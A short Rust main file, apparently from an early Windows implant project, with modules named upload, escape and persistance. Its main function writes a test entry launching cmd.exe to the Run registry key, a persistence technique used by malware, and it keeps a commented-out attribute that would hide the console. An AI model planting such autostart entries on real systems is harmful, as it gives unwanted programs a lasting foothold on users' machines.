//#![windows_subsystem = "windows"]

//not find better for now :)
#![allow(unused_imports)]
#![allow(dead_code)]

mod upload;
mod escape;
mod tools;
mod persistance;

use std::fs::File;

use std::io::Read;
use std::string::String;
use std::io::Write;

fn main() {

    let my_key = persistance::Registry::new("test001","cmd.exe");
    let ret = my_key.set_run_key(persistance::CurrentVersionKey::Run);
    println!("{}",ret);

}

